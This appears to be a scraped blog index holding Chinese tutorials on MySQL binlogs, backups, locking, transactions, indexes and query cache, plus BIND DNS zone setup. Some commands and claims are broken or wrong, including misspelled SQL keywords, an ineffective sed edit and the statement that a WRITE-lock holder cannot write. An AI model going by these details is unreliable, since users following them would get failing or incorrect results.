事件发生的日期和时间：180611 14:24:50 事件发生的服务器标识：server id 1 事件的结束位置：end_log_pos 1734 事件的类型：Query 事件发生时所在服务器执行此事件的线程的ID：thread_id=1 语句的时间戳与将其写入二进制文件中的时间差：exec_time=0 错误代码：error_code=0 执行的操作：update students set name='xyz' where stuid=10 清除指定二进制日志 PURGE:\n 清除指定二进制日志：  PURGE { BINARY | MASTER } LOGS { TO 'log_name' | BEFORE datetime_expr }  示例：  PURGE BINARY LOGS BEFORE '2018-01-23'; PURGE BINARY LOGS BEFORE '2018-05-22 09:25:30';  删除所有二进制日志，index文件重新记数  RESET MASTER [TO #]; 日志文件从#开始记数，默认从1开始，一般是master第一次启动时执行，MariaDB10.1.6开始支持TO #\n 切换日志文件：FLUSH LOGS，后续备份的mysqldump -F,就是切换日志文件进行备份  -- 清楚000002之前的二进制文件， pruge binary logs to \u0026#34;mysql-bin.000002\u0026#34;; show master logs; +------------------+-----------+ | Log_name | File_size | +------------------+-----------+ | mysql-bin.000002 | 10042 | | mysql-bin.000003 | 1812 | | mysql-bin.000004 | 385 | +------------------+-----------+ -- 删除至000001的二进制文件 reset master to 1 备份和恢复 为什么要备份\n 灾难恢复：硬件故障、软件故障、自然灾害、黑客攻击、误操作测试等数据  丢失场景\n 备份注意要点 能容忍最多丢失多少数据 恢复数据需要在多长时间内完成 需要恢复哪些数据 还原要点 做还原测试，用于测试备份的可用性 还原演练\n 备份类型： 完全备份，部分备份\n 完全备份：整个数据集 部分备份：只备份数据子集，如部分库或表  完全备份、增量备份、差异备份\n 增量备份：仅备份最近一次完全备份或增量备份（如果存在增量）以来变化的数据，备份较快，还原复杂 差异备份：仅备份最近一次完全备份以来变化的数据，备份较慢，还原简单  **注意：**二进制日志文件不应该与数据文件放在同一磁盘\n冷、温、热备份\n 冷备：读写操作均不可进行 温备：读操作可执行；但写操作不可执行 热备：读写操作均可执行   MyISAM：温备，不支持热备 InnoDB: 都支持\n 物理和逻辑备份\n  物理备份：直接复制数据文件进行备份，与存储引擎有关，占用较多的空间，速度快\n  逻辑备份：从数据库中“导出”数据另存而进行的备份，与存储引擎无关，占用空间少，速度慢，可能丢失精度\n  备份时需要考虑的因素\n 温备的持锁多久 备份产生的负载 备份过程的时长 恢复过程的时长\n 备份什么\n 数据 二进制日志、InnoDB的事务日志 程序代码（存储过程、存储函数、触发器、事件调度器） 服务器的配置文件\n 冷备份: 服务器可以停机的情况下,备份加还原\n$ systemctl stop mariadb $ ll /var/lib/mysql/ $ tar -Jcvf /data/all.tar.xz /var/lib/mysql/ $ rm -fr /var/lib/mysql/ $ tar -xf /data/all.tar.xz /var/lib/mysql/ $ mv /var/lib/mysql/var/lib/mysql/* /var/lib/mysql/ $ rm -rf /var/lib/mysql/var $ systemctl start mariadb 未完待续\n","permalink":"https://www.fenghong.tech/blog/2018/2018-06-12-mysql-05/","tags":["Linux","binlog"],"title":"MYSQL日志"},{"categories":["mysql"],"contents":"摘要：MYsql的并发控制，锁，事务了解，涵盖了事务安全，事务原理，事务回滚点，事务特性\n并发控制 LOCK TABLES tbl_name [[AS] alias] lock_type [, tbl_name [[AS] alias] lock_type] ... lock_type: READ ， WRITE UNLOCK TABLES -- 解锁 FLUSH TABLES tb_name[,...] [WITH READ LOCK] -- 关闭正在打开的表（清除查询缓存），通常在备份前加全局读锁 MariaDB [hellodb]\u0026gt; SELECT clause [FOR UPDATE | LOCK IN SHARE MODE] -- 查询时加写或读锁   锁：\n  读锁：共享锁，只读不可写，多个读互不阻塞，\nMariaDB [hellodb]\u0026gt; LOCK TABLES students READ;\n  写锁：独占锁,排它锁，一个写锁会阻塞其它读和它锁\nMariaDB [hellodb]\u0026gt; LOCK TABLES students WRITE;\n    实现\n 存储引擎：自行实现其锁策略和锁粒度 服务器级：实现了锁，表级锁；用户可显式请求    分类：\n 隐式锁：由存储引擎自动施加锁 显式锁：用户手动请求    锁机制： innodb默认是行锁，但是如果在事务操做过程中，没有使用到索引，系统会自动进行全表检索苏剧，自动升级为表所，后续事务会讲到。\n 行锁：只有当前行被锁住，别的用户不能操作当前行 表所：整张表被锁住，别的用户都不能操作 页锁：显示的整页被锁住    read 锁 自己可以读，但是不可以写；其他人可以读，不可以写。\nlock tables students read; update students set classid=3 where stuid=25; -- 均不可写，只可读 write 锁 自己可以读，但是不可以写；其他人不可以读\nflush tables students; -- 清除缓存 lock tables students write; select * from students where stuid=12; -- 其他终端不可读此表，自己可读 死锁： 两个或多个事务在同一资源相互占用，并请求锁定对方占用的资源的状态.相当于行级锁。\n事务 事务了解  事务Transactions：一组原子性的SQL语句，或一个独立工作单元 事务日志：记录事务信息，实现undo,redo等故障恢复功能  -- 创建一个账户表 use testdb; create table my_account( number char(16) not null unique , name varchar(20) not null, money decimal(10,2) default 0.0 )charset utf8; -- 插入数据 insert into my_account values (\u0026#39;0000000000001\u0026#39;,\u0026#39;张三\u0026#39;,100000), (\u0026#39;0000000000002\u0026#39;,\u0026#39;李四\u0026#39;,200000); -- 开启事务 start transaction; -- 更新数据库 alter table my_account add id int primary key auto_increment first; insert into my_account values (\u0026#39;3\u0026#39;,\u0026#39;0000000000003\u0026#39;,\u0026#39;王五\u0026#39;,300000); update my_account set money = money - 100000 where id = 1 ; -- 另开一个账户查看是否修改了表 update my_account set money = money + 100000 where id = 2 ; -- 另开一个账户查看是否修改了表 -- 提交事务 commit； 事务操作 事务操作分为两种：自动事务(默认的)，手动事务\n手动事务：\n  开启事务：告诉系统所有的操作（写）不要直接写到数据库的表中，先放入事务日志中；start transaction;\n  事务操作：1. 张三账户减少\nMariaDB[testdb]\u0026gt; update my_account set money = money - 100000 where id = 1 ;\n  事务操作：2. 李四账户增加\nMariaDB[testdb]\u0026gt; update my_account set money = money + 100000 where id = 2 ;\n  事务关闭：选择性将日志文件中的操作的结果报错到数据表中，清空事务日志\n  提交事务：同步数据表（操作成功）commit；\n  回滚事务：直接清空日志表（操作失败）rollback；\n    注意：只有事务型存储引擎方能支持此类操作,如innodb\n  事务原理\n回滚点 回滚点：在某个成功的操作完成之后，后续的操作有可能成功也可能失败，但是无论结果如何，可以在当前的成功位置上，设置一个点。可以供后续的失败操作返回到该位置，而不是返回所有操作，这个点称为回滚点。\n设置回滚点：savepoint 回滚点名字;一个回滚点，只能回滚一次\nrelease savepoint identified;\n-- 回滚点操作 -- 开启事务 start transaction; select * from my_account; -- 事务处理1：张三加钱 update my_account set money = money + 10000 where id = 1; -- 设置回滚点 savepoint sp1; -- 银行扣税 update my_account set money = money - 10000 * 0.05 where id = 2 ; -- 扣错了 select * from my_account; -- 回滚 rollback to sp1; -- 继续操作 update my_account set money = money - 10000 * 0.05 where id = 1 ; select * from my_account; -- 提交 commit； 自动事务处理 在mysql中：默认的都是自动事务处理，用户操作完立即同步到数据表中。\n-- 系统默认自动事务 show variabes like \u0026#39;autocommit\u0026#39;; set autocommit=0 -- 李四加工资 start transaction; update my_account set money = money + 10000 where id = 2; -- 手动提交 commit； -- 一般使用自动事务 set autocommit=1 -- 扣税 update my_account set money = money - 10000*0.05 where id = 2;  注意：通常都会使用自动事务. 减少重复的工作  事务的特性  ACID特性： A：atomicity原子性；整个事务中的所有操作要么全部成功执行，要么全部失败后回滚 C：consistency一致性；数据库总是从一个一致性状态转换为另一个一致性状态 I：Isolation隔离性；一个事务所做出的操作在提交之前，是不能为其它事务所见，存于数据的日志中，彼此之间不受影响；隔离有多种隔离级别，实现并发 D：durability持久性；一旦事务提交，其所做的修改会永久保存于数据库中  事务隔离级别： 从上至下更加严格\n READ-UNCOMMITTED 可读取到未提交数据，产生脏读 READ-COMMITTED 可读取到提交数据，但未提交数据不可读，产生不可重复读，即可读取到多个提交数据，导致每次读取数据不一致 REPEATABLE-READ 可重复读，多次读取数据都一致，产生幻读，即读取过程中，即使有其它提交的事务修改数据，仍只能读取到未修改前的旧数据。此为MySQL默认设置 SERIALIZABILE 可串行化，未提交的读事务阻塞修改事务，或者未提交的修改事务阻塞读事务。导致并发性能差  MVCC: 多版本并发控制，和事务级别相关\n事务的隔离性：READ-UNCOMMITTED 在两个会话中\nset tx_isolation=\u0026#39;READ-UNCOMMITTED\u0026#39;; start transaction; update my_account set money = money + 10000 where name = \u0026#39;王五\u0026#39;; select * from my_account; -- 未提交，产生脏读 事务的隔离性：READ-COMMITTED 在两个会话中\nset tx_isolation='READ-COMMITTED'; start transaction; update my_account set money = money + 10000 where name = '李四'; select * from my_account; -- 未提交，另外一边不能读到未提交的数据 commit；\t-- 提交之后，可以读取新数据 事务的隔离性：REPEATABLE-READ set tx_isolation=\u0026#39;REPEATABLE-READ\u0026#39;; start transaction; update my_account set money = money + 10000 where name = \u0026#39;张三\u0026#39;; select * from my_account; commit；\tselect * from my_account; --不管是否提交，都看不到新的数据 事务的隔离性：SERIALIZABILE 不用索引，系统会进行全表索引，会导致事务升级为表级锁，并发性能差\nset tz_isolation='SERIALIZABILE'; start transaction; update my_account set money = money + 10000 where name = '张三'; select * from my_account ; -- 数据未更新 update my_account set money = money + 10000 where id = 2; -- 显示等待，事务升级为表级锁 总结：支持事务的引擎有innodb，而myisam是不支持事务的，一般涉及到钱的，基本会用到事务。\nstart transaction; update students set gender='M'; -- 未提交，导致全表锁，造成大量用户无法访问 show processlist; +----+--------+-----------+---------+---------+------+----------+------------------+----------+ | Id | User | Host | db | Command | Time | State | Info | Progress | +----+--------+-----------+---------+---------+------+----------+------------------+----------+ | 10 | root | localhost | hellodb | Query | 0 | init | show processlist | 0.000 | | 11 | root | localhost | hellodb | Sleep | 4962 | | NULL | 0.000 | +----+--------+-----------+---------+---------+------+----------+------------------+----------+ kill id -- 杀掉进程 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-mysql-04/","tags":["Linux","mysql"],"title":"MYSQL并发控制"},{"categories":["mysql"],"contents":"摘要：mysql的数据引擎，服务器配置，query_cache，索引，锁等相关的介绍\nMYSQL数据库引擎 MyISAM引擎特点：  不支持事务 表级锁定 读写相互阻塞，写入不能读，读时不能写 只缓存索引 不支持外键约束 不支持聚簇索引 读取数据较快，占用资源较少 不支持MVCC（多版本并发控制机制）高并发 崩溃恢复性较差 MySQL5.5.5前默认的数据库引擎  Myisam适用场景：只读，小文件，引擎文件如下\nMyisam的引擎文件：\n tbl_name.frm: 表格式定义 tbl_name.MYD: 数据文件 tbl_name.MYI: 索引文件  innoDB InnoDB引擎特点：\n  行级锁\n  支持事务，适合处理大量短期事务\n  读写阻塞与事务隔离级别相关\n  可缓存数据和索引\n  崩溃恢复性更好\n  支持MVCC高并发\n  从MySQL5.5后支持全文索引\n  从MySQL5.5.5开始为默认的数据库引擎\n  Locking granularity raw lock\n  transactions 支持事务，适合处理大量短期事务\n  Clustered indexes 聚簇索引\n  Date/Index caches\n  Foreign key support\n   每个表单独使用一个表空间存储表的数据和索引 启用：innodb_file_per_table=ON 两类文件放在数据库独立目录中 数据文件(存储数据和索引)：tb_name.ibd 表格式定义：tb_name.frm。\n $vim /etc/my.cnf [mysqld] innodb_file_per_table default_storage_engine=InnDB $ systemctl restart mariadb $mysql \u0026lt; hellodb1_innodb.sql $ll /var/lib/mysql/hellodb1/ -rw-rw----. 1 mysql mysql 8636 Jun 8 10:38 classes.frm -rw-rw----. 1 mysql mysql 98304 Jun 8 10:38 classes.ibd  查看mysql支持的存储引擎:  show engines; show variables like '%storage_engine%';  设置默认的存储引擎：  vim /etc/my.conf [mysqld] default_storage_engine= InnoDB;  查看库中所有表使用的存储引擎  Show table status from db_name;\n 查看库中指定表的存储引擎  show table status like ' tb_name '; show create table tb_name;  设置表的存储引擎：  CREATE TABLE tb_name(... ) ENGINE=InnoDB; ALTER TABLE tb_name ENGINE=InnoDB; 服务器配置  服务器系统变量：分全局和会话两种 服务器状态变量：分全局和会话两种 获取运行中的mysql进程使用各服务器参数及其值  mysql\u0026gt; SHOW GLOBAL VARIABLES; mysql\u0026gt; SHOW [SESSION] VARIABLES;   设置服务器系统变量三种方法：\n  在命令行中设置: shell\u0026gt; ./mysqld_safe –-skip-name-resolve=1;\n  在配置文件my.cnf中设置： ]#vim /etc/my.cnf\nskip_name_resolve=1;\n  在mysql客户端使用SET命令： mysql\u0026gt;SET GLOBAL sql_log_bin=0\n    修改服务器变量的值：\n mysql\u0026gt; help SET    修改全局变量：仅对修改后新创建的会话有效；对已经建立的会话无效\n mysql\u0026gt; SET GLOBAL system_var_name=value; mysql\u0026gt; SET @@global.system_var_name=value;    修改会话变量：\n mysql\u0026gt; SET [SESSION] system_var_name=value; mysql\u0026gt; SET @@[session.]system_var_name=value;    状态变量（只读）：用于保存mysqld运行中的统计数据的变量，不可更改\n mysql\u0026gt; SHOW GLOBAL STATUS; mysql\u0026gt; SHOW [SESSION] STATUS;    varialbes 查询一些系统自带的变量，数据文件datadir,baseddir, tmpdir\nMariaDB [(none)]\u0026gt; show variables like 'datadir'; MariaDB [(none)]\u0026gt; show variables like 'basedir'; MariaDB [(none)]\u0026gt; show variables like '%dir'; SQL_MODE **SQL_MODE：**对其设置可以完成一些约束检查的工作,可分别进行全局的设置或当前会话的设置，参看：官方介绍 常见MODE:\n  NO_AUTO_CREATE_USER 禁止GRANT创建密码为空的用户 NO_AUTO_VALUE_ON_ZERO 在自增长的列中插入0或NULL将不会是下一个自增长值 NO_BACKSLASH_ESCAPES 反斜杠“\\”作为普通字符而非转义字符 PAD_CHAR_TO_FULL_LENGTH 启用后，对于CHAR类型将不会截断空洞数据 PIPES_AS_CONCAT 将\u0026quot;||\u0026quot;视为连接操作符而非“或运算符”   MariaDB [(none)]\u0026gt; SHOW VARIABLES LIKE \u0026#39;sql_mode\u0026#39;; #默认为空 +---------------+-------+ | Variable_name | Value | +---------------+-------+ | sql_mode | | +---------------+-------+ MariaDB [hellodb]\u0026gt; set sql_mode=\u0026#39;NO_AUTO_CREATE_USER\u0026#39;; MariaDB [hellodb]\u0026gt; grant all on *.* to hong@\u0026#39;192.%\u0026#39; ; #这里授权创建用户就提示错误 ERROR 1133 (42000): Can\u0026#39;t find any matching row in the user table MariaDB [hellodb]\u0026gt; set sql_mode=\u0026#39;\u0026#39;; MariaDB [hellodb]\u0026gt; grant all on *.* to hong@\u0026#39;192.%\u0026#39; ; #删除sql_mode，立马生效， 这里的sql_mode权限比较多，set起来比较麻烦，系统自带关键字traditional\ntraditonal=STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\n设置sql_mode权限如下：\nMariaDB [(none)]\u0026gt; set sql_mode='traditional' MariaDB [(none)]\u0026gt; show variables like 'sql_mode'; #可以看到一大串的sql_mode了。 Query Cache  优缺点 不需要对SQL语句做任何解析和执行，当然语法解析必须通过在先，直接从Query Cache中获得查询结果，提高查询性能查询缓存的判断规则，不够智能，也即提高了查询缓存的使用门槛，降低其效率；查询缓存的使用，会增加检查和清理Query Cache中记录集的开销 SQL_NO_CACHE  查询语句中含有获得值的函数，包含自定义函数，如：NOW() CURDATE()、GET_LOCK()、RAND()、CONVERT_TZ()等 系统数据库的查询：mysql、information_schema 查询语句中使用SESSION级别变量或存储过程中的局部变量 查询语句中使用了LOCK IN SHARE MODE、FOR UPDATE的语句，查询语句中类似SELECT …INTO 导出数据的语句 对临时表的查询操作；存在警告信息的查询语句；不涉及任何表或视图的查询语句；某用户只有列级别权限的查询语句 事务隔离级别为Serializable时，所有查询语句都不能缓存    MariaDB [(none)]\u0026gt; show variables like 'query_cache%'; +------------------------------+---------+ | Variable_name | Value | +------------------------------+---------+ | query_cache_limit | 1048576 |\t#1M,单个查询结果能缓存的最大值 | query_cache_min_res_unit | 4096 |\t#4k,查询缓存中内存块的最小分配单位 | query_cache_size | 0 |\t#查询缓存总共可用的内存空间，1024的整数倍 | query_cache_strip_comments | OFF |\t| query_cache_type | ON |\t#是否开启缓存功能 | query_cache_wlock_invalidate | OFF |\t#某表被其它的会话锁定，是否从查询返回结果 +------------------------------+---------+  查询缓存相关的状态变量  MariaDB [(none)]\u0026gt; show global status like 'Qcache%'; +-------------------------+----------+ | Variable_name | Value | +-------------------------+----------+ | Qcache_free_blocks | 1 | | Qcache_free_memory | 33536824 | | Qcache_hits | 0 | | Qcache_inserts | 0 | | Qcache_lowmem_prunes | 0 | | Qcache_not_cached | 4 | | Qcache_queries_in_cache | 0 | | Qcache_total_blocks | 1 | +-------------------------+----------+ 解释如下：\n  Qcache_free_blocks：处于空闲状态 Query Cache中内存 Block 数 Qcache_free_memory：处于空闲状态的 Query Cache 内存总量 Qcache_hits：Query Cache 命中次数 Qcache_inserts：向 Query Cache 中插入新的 Query Cache 的次数，即没有命中的次数 Qcache_lowmem_prunes：当 Query Cache 内存容量不够，需要删除老的Query Cache 以给新的 Cache 对象使用的次数 Qcache_not_cached：没有被 Cache 的 SQL 数，包括无法被 Cache 的 SQL 及由于 query_cache_type 设置的不会被 Cache 的 SQL语句 Qcache_queries_in_cache：在 Query Cache 中的 SQL 数量 Qcache_total_blocks：Query Cache 中总的 Block   修改query_cache_size的值，保存到配置文件使之生效\n$vim /etc/my.cnf $sed -i '/mysqld\\query_cache_size=10M/' /etc/my.cnf $systemctl restart mariadb 索引 索引简介 索引：系统根据某种算法，将已有的数据（未来可能增加的数据），单独建立一个文件，文件能实现亏啊苏匹配数据，并且能够快速找到对应表的记录。\n索引是特殊数据结构：\n 定义在查找时作为查找条件的字段  索引实现在存储引擎\n优点：\n 索引可以降低服务需要扫描的数据量，减少了IO次数 索引可以帮助服务器避免排序和使用临时表 索引可以帮助将随机I/O转为顺序I/O  缺点：\n 占用额外空间，影响插入速度  索引类型：\n 聚簇（集）索引、非聚簇索引：  数据和索引存储顺序是否一致，数据和所以是否存放一起   主键索引、辅助索引 稠密索引、稀疏索引：是否索引了每一个数据项 B+ TREE、HASH、R TREE 简单索引、组合索引  左前缀索引：\n 取前面的字符做索引  覆盖索引：\n 从索引中即可取出要查询的数据，性能高 explain 跟踪解释索引的信息  MariaDB [hellodb]\u0026gt; SET GLOBAL userstat=1;\t#查询索引使用情况的开关 MariaDB [hellodb]\u0026gt; explain select * from students where age = 20\\G; raws: 25 MariaDB [hellodb]\u0026gt; CREATE INDEX INDEX_AGE ON students(AGE); #建立age索引 MariaDB [hellodb]\u0026gt; explain select * from students where age = 20\\G; #解析命令查询结果 raws: 2 MariaDB [hellodb]\u0026gt; CREATE INDEX INDEX_NAME ON students(name); MariaDB [hellodb]\u0026gt; explain select * from students where name like \u0026#39;%b\u0026#39;\\G; MariaDB [hellodb]\u0026gt; SHOW INDEX_STATISTICS; 删除索引,并建立符合索引\ndrop index index_age on students; create index index_name_age on students(name,age); explain select * from students where name like\u0026#39;S%\u0026#39;; -- 用到索引 explain select * from students where name like\u0026#39;%x%\u0026#39;; -- 没有用到索引 explain select * from students where age=19; -- 没有用到索引 explain select * from students where stuid \u0026gt;10 and age=19; -- 用到索引 explain select * from students where name=\u0026#39;Xi Ren\u0026#39;; -- 用到索引 explain select * from students where age \u0026gt; (select avg(age) from students )\\G; *************************** 1. row *************************** id: 1 select_type: PRIMARY table: students type: ALL *************************** 2. row *************************** id: 2 select_type: SUBQUERY table: students type: index 总结：复合索引的顺序很重要，比如index_name_age,name相当于主索引，age相当于副索引，不同的语法导致会用不到索引。可以用explain比较两条SQL语句查询用到的raws数，比较命令的好坏\nB+TREE  B+ Tree索引：顺序存储，每一个叶子节点到根结点的距离是相同的；左前缀索引，适合查询范围类的数据 可以使用B-Tree索引的查询类型：   全值匹配：精确所有索引列，如：姓wang，名xiaochun，年龄30 匹配最左前缀：即只使用索引的第一列，如：姓wang 匹配列前缀：只匹配一列值开头部分，如：姓以w开头的 匹配范围值：如：姓ma和姓wang之间 精确匹配某一列并范围匹配另一列：如：姓wang,名以x开头的 只访问索引的查询\n B-Tree索引的限制：\n 如果不从最左列开始，则无法使用索引：如：查找名为xiaochun，或姓为g结尾 不能跳过索引中的列：如：查找姓wang，年龄30的，只能使用索引第一列 如果查询中某个列是为范围查询，那么其右侧的列都无法再使用索引：如：姓wang,名x%,年龄30，只能利用姓和名上面的索引  特别提示：\n 索引列的顺序和查询语句的写法应相匹配，才能更好的利用索引 为优化性能，可能需要针对相同的列但顺序不同创建不同的索引来满足不同类型的查询需求  Hash 索引   Hash索引：基于哈希表实现，只有精确匹配索引中的所有列的查询才有效，索引自身只存储索引列对应的哈希值和数据指针，索引结构紧凑，查询性能好\n  只有Memory存储引擎支持显式hash索引\n  适用场景：\n 只支持等值比较查询，包括=, IN(), \u0026lt;=\u0026gt;    不适合使用hash索引的场景：\n 不适用于顺序查询：索引存储顺序的不是值的顺序 不支持模糊匹配 不支持范围查询 不支持部分索引列匹配查找：如A，B列索引，只查询A列索引无效    索引优化策略：  独立地使用列：尽量避免其参与运算，独立的列指索引列不能是表达式的一  部分，也不能是函数的参数，在where条件中，始终将索引列单独放在比较 符号的一侧\n 左前缀索引：构建指定索引字段的左侧的字符数，要通过索引选择性来评估  索引选择性：不重复的索引值和数据表的记录总数的比值\n 多列索引：AND操作时更适合使用多列索引，而非为每个列创建单独的索引 选择合适的索引列顺序：无排序和分组时，将选择性最高放左侧  索引优化建议:  只要列中含有NULL值，就最好不要在此例设置索引，复合索引如果有NULL值，此列在使用时也不会使用索引;\n尽量使用短索引，如果可以，应该制定一个前缀长度;\n对于经常在where子句使用的列，最好设置索引;\n对于有多个列where或者order by子句，应该建立复合索引;\n对于like语句，以%或者‘-’开头的不会使用索引，以%结尾会使用索引;\n尽量不要在列上进行运算（函数操作和表达式操作）;\n尽量不要使用not in和\u0026lt;\u0026gt;操作;\n多表连接时，尽量小表驱动大表，即小表 join 大表;\n在千万级分页时使用limit;\n对于经常使用的查询，可以开启缓存;\n大部分情况连接效率远大于子查询.\n mysql中提供了多种索引\n 主键索引：primary key 唯一索引：unique key 全文索引：full 普通索引：index  并发控制 LOCK TABLES tbl_name [[AS] alias] lock_type [, tbl_name [[AS] alias] lock_type] ... lock_type: READ ， WRITE UNLOCK TABLES #解锁 FLUSH TABLES tb_name[,...] [WITH READ LOCK] #关闭正在打开的表（清除查询缓存），通常在备份前加全局读锁 MariaDB [hellodb]\u0026gt; SELECT clause [FOR UPDATE | LOCK IN SHARE MODE] #查询时加写或读锁   锁：\n  读锁：共享锁，只读不可写，多个读互不阻塞，\nMariaDB [hellodb]\u0026gt; LOCK TABLES students READ;\n  写锁：独占锁,排它锁，一个写锁会阻塞其它读和它锁\nMariaDB [hellodb]\u0026gt; LOCK TABLES students WRITE;\n    实现\n 存储引擎：自行实现其锁策略和锁粒度 服务器级：实现了锁，表级锁；用户可显式请求    分类：\n 隐式锁：由存储引擎自动施加锁 显式锁：用户手动请求    锁机制： innodb默认是行锁，但是如果在事务操做过程中，没有使用到索引，系统会自动进行全表检索苏剧，自动升级为表所，后续事务会讲到。\n 行锁：只有当前行被锁住，别的用户不能操作当前行 表所：整张表被锁住，别的用户都不能操作 页锁：显示的整页被锁住    read 锁 自己可以读，但是不可以写；其他人可以读，不可以写。\nlock tables students read; update students set classid=3 where stuid=25; ERROR 1099 (HY000): Table 'students' was locked with a READ lock and can't be updated write锁 自己可以读，但是不可以写；其他人不可以读\nflush tables students; #清除缓存 lock tables students write; select * from students where stuid=12; ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-mysql-03/","tags":["Linux","mysql","index"],"title":"MYSQL数据引擎"},{"categories":["internet"],"contents":"DNS服务 DNS:Domain Name Service 应用层协议\n C/S,53/udp, 53/tcp  BIND：Bekerley Internat Name Domain ISC 本地名称解析配置文件：hosts\n /etc/hosts %WINDIR%/system32/drivers/etc/hosts 93.46.8.89 Google\n 根域： .\n 一级域名：Top Level Domain: tld  com, edu, mil, gov, net, org, int,arpa\n  三类：组织域、国家域(.cn, .ca, .hk, .tw)、反向域\n  二级域名，三级域名，最多127级域名\n  ICANN（The Internet Corporation for Assigned Names and Numbers）互联网名称与数字地址分配机构，负责在全球范围内对互联网通用顶级域名（gTLD）以及国家和地区顶级域名（ccTLD）系统的管理、以及根服务器系统的管理\n  DNS类型：\n\u0026gt; 递归查询 \u0026gt; 迭代查询 \u0026gt; 名称服务器：域内负责解析本域内的名称的主机 \u0026gt; 根服务器：13组服务器 \u0026gt; 解析类型： \u0026gt; 正向解析：FQDN --\u0026gt; IP \u0026gt; 反向解析：IP --\u0026gt; FQDN \u0026gt; 注意：正反向解析是两个不同的名称空间，是两棵不同的解析树 一次完整的查询请求经过的流程：\n\u0026gt; Client --\u0026gt;hosts文件 --\u0026gt;DNS Service Local Cache --\u0026gt; DNS Server(recursion) --\u0026gt; Server Cache --\u0026gt; iteration(迭代) --\u0026gt; 根--\u0026gt; 顶级域名DNS--\u0026gt;二级域名DNS… \u0026gt; 解析答案： \u0026gt; 肯定答案： \u0026gt; 否定答案：请求的条目不存在等原因导致无法返回结果 \u0026gt; 权威答案： \u0026gt; 非权威答案： 区域zone的资源记录(RR)  记录类型：A, AAAA, PTR, SOA, NS, CNAME, MX, - SOA：Start Of Authority，起始授权记录；一个区域解析库有且仅能有一个SOA记录，必须位于解析库的第一条记录 - A：internet Address，作用，FQDN --\u0026gt; IP - AAAA: FQDN --\u0026gt; IPv6 - PTR: PoinTeR，IP --\u0026gt; FQDN - NS: Name Server，专用于标明当前区域的DNS服务器 - CNAME：Canonical Name，别名记录 - MX: Mail eXchanger，邮件交换器 资源记录定义的格式：\n语法：name [TTL] IN rr_type value\n注意：\n\u0026gt;1. TTL可从全局继承 \u0026gt;2. @可用于引用当前区域的名字 \u0026gt;3. 同一个名字可以通过多条记录定义多个不同的值；此时DNS服务器会以轮询方式响应 \u0026gt;4. 同一个值也可能有多个不同的定义名字；通过多个不同的名字指向同一个值进行定义；此仅表示通过多个不同的名字可以找到同一个主机 正向解析文件格式 FQDN\u0026mdash;\u0026gt;IP\n/var/named/ZONE_NAME.zone\n$TTL 1D @\tIN SOA dns1.feng.com. admin.feng.com. ( 0\t; Serial\t#序列号，主从服务器同步更新的条件，最多4294967296(2^32) 1D\t; Refresh #刷新时间,slave 会去向 master 要求数据更新的判断的时间定义 1H\t; Retry\t#重试时间 1W\t; Expire\t#过期时间 3H )\t; minimum\tNS\tdns1.feng.com.\t#省略写法，dns1.feng.com.\t1D\tIN\tNS\tdns1.feng.com. dns1\tA 192.168.1.8 #省略写法，dns1.feng.com.\t1D\tIN\tA\t192.168.1.8 master\tA\t192.168.1.200\t#省略写法，master.feng.com.\t1D\tIN\tA\t192.168.1.100 $GENERATE 1-254 HOST$ A 192.168.1.$ #对应192.168.1.{1..254}的主机对应记录 *.feng.com\tA\t192.168.1.200 #泛域名解析 websrv\tA 192.168.1.10 websrv\tA 192.168.1.11 websrv\tA 192.168.1.12 www\tCNAME websrv #别名解析，实现负载均衡。 SOA数据的说明:\n\u0026gt; Serial \u0026lt; 2^32 = 4294967296 \u0026gt; Refresh \u0026gt;= Retry *2 \u0026gt; Refresh + Retry \u0026lt; Expire \u0026gt; Expire \u0026gt;= Rrtry * 10 \u0026gt; Expire \u0026gt;= 7D 一般来说，如果 DNS RR 资料变更情况频繁的，那么上述的相关数值可以订定的小一些，如果 DNS RR 是很稳定的， 为了节省带宽，则可以将 Refresh 设定的较大一些 .\n反向解析文件格式 IP \u0026mdash;\u0026gt;FQDN\n/var/named/ZONE_NAME.zone\n$TTL 1D @ IN\tSOA\tdns1.feng.com.\tadmin.feng.com.\t( 1 1D 1H 1W 3H ) NS\tdns1.feng.com. dns1.feng.com.\tA\t192.168.1.9 8\tPTR\twebsrv.feng.com.\t#省略写法， 8.1.168.192.in-addr.arpa. IN PTR websrv.feng.com. 6\tPTR\tappsrv.feng.com. 100\tPTR\tmailsrv.feng.com. 子域  子域授权：每个域的名称服务器，都是通过其上级名称服务器在解析库进行授权，资源记录如下：  .com. IN NS ns1.com. .com. IN NS ns2.com. ns1.com. IN\tA\t2.2.2.1 ns2.com.\tIN\tA\t2.2.2.2 bind服务器(base源) 安装bind服务 yum install -y bind \n文件：\n 主配置文件：/etc/named.conf, /etc/named.rfc1912.zones, /etc/rndc.key 解析库文件：/var/named/ ZONE_NAME.ZONE 解析库文件必须存在named.ca文件，默认与bind安装在同一主机，且只能通过127.0.0.1连接named进程  测试命令dig dig [-t type] name [@SERVER][query options]\n dig只用于测试dns系统，不会查询hosts文件进行解析 查询选项：   +[no]trace：跟踪解析过程 : dig +trace feng.com\n+[no]recurse：进行递归解析\n测试反向解析：\ndig -x IP = dig –t ptr reverseip.in-addr.arpa\n模拟区域传送：\n dig -t axfr ZONE_NAME @SERVER dig -t axfr feng.com @10.10.10.11 dig –t axfr 100.1.10.in-addr.arpa @172.16.1.1 dig -t NS . @114.114.114.114 dig -t NS . @a.root-servers.net host测试命令 格式：host [-t type] name [SERVER]\nhost –t NS feng.com 172.16.0.1 host –t soa feng.com host –t mx feng.com host –t axfr feng.com host 1.2.3.4 nslookup命令及DNS动态更新 nslookup命令： nslookup [-option][name][server]\n交互式模式：\n nslookup\u0026gt; server IP: 指明使用哪个DNS server进行查询 set q=RR_TYPE: 指明查询的资源记录类型 NAME: 要查询的名称 指定的zone语句块中或者全局的options配置文件中： Allow-update {any;};  远程主机端：\n]$ chmod 770 /var/named ]$ setsebool -P named_write_master_zones on ]$ nsupdate \u0026gt;server 192.168.1.9 \u0026gt;zone feng.com \u0026gt;update add ftp.feng.com 88888 IN A 8.8.8.8 \u0026gt;send \u0026gt;update delete www.feng.com A \u0026gt;send 测试：dig ftp.feng.com @192.168.1.9 在DNS服务器端会生成一个日志文件feng.com.zone.jnl ]$ ll /var/named/feng.com.zone.jnl ]$ cat /var/named/feng.com.zone 将feng.com.zone的文件格式规划好了 客户端的设定 